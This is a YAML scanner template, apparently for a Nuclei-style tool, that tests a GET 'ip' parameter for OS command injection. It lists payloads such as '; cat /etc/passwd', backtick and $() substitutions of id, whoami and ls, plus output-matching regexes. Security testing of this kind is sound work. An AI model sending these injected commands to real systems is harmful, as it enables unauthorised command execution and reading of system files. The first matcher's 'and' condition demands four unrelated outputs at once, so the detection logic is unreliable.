id: generic-command-injection
info:
  name: Command Injection
  severity: critical
  description: Generic OS command injection testing
  tags:
    - rce
    - command-injection
    - generic

generic:
  endpoint: "{{command_injection}}"

  method: GET

  parameter: "ip"

  payloads:
    - name: "pipe_ls"
      value: "; ls"
      description: "Semicolon with ls"

    - name: "pipe_whoami"
      value: "; whoami"
      description: "Semicolon with whoami"

    - name: "backtick_whoami"
      value: "`whoami`"
      description: "Backtick command substitution"

    - name: "dollar_ls"
      value: "$(ls)"
      description: "Dollar sign command substitution"

    - name: "and_ampersand"
      value: "&& ls"
      description: "AND operator with ls"

    - name: "pipe_operator"
      value: "| cat /etc/passwd"
      description: "Pipe to read passwd"

    - name: "semicolon_passwd"
      value: "; cat /etc/passwd"
      description: "Semicolon to read passwd"

    - name: "backtick_id"
      value: "`id`"
      description: "Backtick with id command"

    - name: "newline_injection"
      value: "%0aid"
      description: "Newline injection"

    - name: "url_encoded_pipe"
      value: "%7Cls%7C"
      description: "URL encoded pipe"

  matchers:
    # Primary matcher: requires SPECIFIC command output patterns
    # Note: 'condition: and' here sets the combining rule for ALL matchers below
    - type: regex
      regex:
        - "uid=\\d+.*gid=\\d+"       # id command output: uid=1000 gid=1000
        - "root:x:0:0.*/bin/bash"  # /etc/passwd with shell
        - "drwxr-xr-x.*\\s+\\d+\\s+"  # ls output with permissions and size
        - "www-data|apache|nobody"  # Common web server users
      condition: and

    # Secondary matcher: ls header format
    - type: regex
      regex:
        - "total\\s+\\d+"  # "total 42" - ls directory header

    # Negative matcher: exclude if page contains common web elements
    # (indicates the match is just in page content, not command output)
    - type: word
      words:
        - "<!DOCTYPE html"
        - "<html"
        - "<head>"
        - "Shopify.routes"
        - "component-"
        - "application/json"
        - "css"
      negative: true
